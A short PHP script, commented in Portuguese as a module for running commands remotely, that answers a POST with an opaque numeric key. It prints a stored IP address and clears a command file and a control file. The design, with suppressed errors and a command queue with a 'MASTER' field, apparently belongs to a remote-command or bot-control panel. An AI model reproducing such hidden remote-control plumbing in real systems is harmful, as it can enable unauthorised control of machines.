<?php
error_reporting(0);
//
// Módulo responsável por executar comandos remotamente no sistema...
//
if(isset($_POST["87324"])){
	$INI = parse_ini_file("CTL.ini", 'IPX');
	$ENDX = $INI['IPX']['IPTR'];
	
	printf($ENDX);
	printf(" ");
	
	$buf = "[UID]\nUID=\nMASTER=\n\n[CMD]\nCMD=";
	$arquivo = fopen("../../databases/cmd.ini", "w");
	$grava = fwrite($arquivo, $buf);
	fclose($arquivo);
	
	$buf = "[IPX]\nIPTR=";
	$arquivo = fopen("CTL.ini", "w");
	$grava = fwrite($arquivo, $buf);
	fclose($arquivo);
	
}
?>
